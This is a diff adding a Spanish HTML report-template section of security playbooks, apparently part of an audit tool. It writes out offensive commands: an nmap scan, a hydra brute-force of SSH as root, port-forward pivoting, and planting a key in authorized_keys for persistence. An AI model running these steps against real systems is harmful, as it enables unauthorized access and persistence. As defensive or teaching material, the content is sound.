@@ -1,0 +1,45 @@
+<section>
+    <h2>Playbooks de Seguridad</h2>
+    <div class="section-divider"></div>
+
+    <p>
+        Esta sección presenta escenarios de explotación y defensa basados en los hallazgos detectados.
+        Los playbooks están construidos usando tácticas MITRE ATT&CK, Kill Chain y técnicas de Red Team.
+    </p>
+
+    <h3>Playbook SSH</h3>
+    <pre>
+Táctica: Initial Access
+Técnica: T1110 — Password Brute Force
+
+1. Descubrimiento de servicio:
+   nmap -p 22 {{ system_name }}
+
+2. Ataque de fuerza bruta:
+   hydra -l root -P rockyou.txt ssh://{{ system_name }}
+
+3. Pivoting si AllowTcpForwarding = yes:
+   ssh -L 3306:localhost:3306 user@{{ system_name }}
+
+4. Persistencia:
+   echo "clave_maliciosa" >> ~/.ssh/authorized_keys
+    </pre>
+
+    <h3>Playbook Firewall (UFW)</h3>
+    <pre>
+Escenario: Puerto crítico expuesto
+
+1. Detección:
+   nmap -sV -p 3306,6379,27017 {{ system_name }}
+
+2. Explotación:
+   Conectar al servicio expuesto con credenciales débiles.
+
+3. Elevación:
+   Explotar service misconfigurations.
+
+4. Defensa:
+   ufw deny 3306
+    </pre>
+
+</section>
